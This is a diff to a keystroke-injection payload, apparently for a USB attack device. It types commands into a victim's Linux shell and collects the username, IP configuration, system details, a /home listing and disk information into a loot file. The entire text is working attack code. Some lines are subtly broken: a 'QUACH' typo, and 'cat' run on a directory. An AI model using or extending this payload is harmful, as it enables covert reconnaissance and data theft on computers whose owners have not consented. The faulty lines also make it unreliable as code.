@@ -34,14 +34,30 @@ sleep 3
 QUACK STRING echo CURRENT USER >> $LOOT 
 QUACK STRING echo ------------ >> $LOOT
 QUACK STRING whoami >> $LOOT
-
+sleep 3
 
 QUACK STRING echo IP CONFIGURATION >> $LOOT
 QUACK STRING echo ---------------- >> $LOOT
 QUACK STRING ip address >> $LOOT
+sleep 3
 
 QUACK STRING echo NEOFETCH >> $LOOT
 QUACK STRING echo -------- >> $LOOT
-QUACK STRING neofetch
+QUACK STRING neofetch >> $LOOT
+sleep 3
+
+QUACK STRING echo "USERS ON DEVICE" >> $LOOT
+QUACK STRING echo --------------- >> $LOOT
+QUACK STRING cat /home/ >> $LOOT
+sleep 3
+
+QUACH STRING echo "DISKS AND NETWORK SHARES" >> $LOOT
+QUACK STRING echo ------------------------ >> $LOOT
+QUACK STRING df -h >> $LOOT
+sleep 3
+
+
+
+
 
 LED FINISH
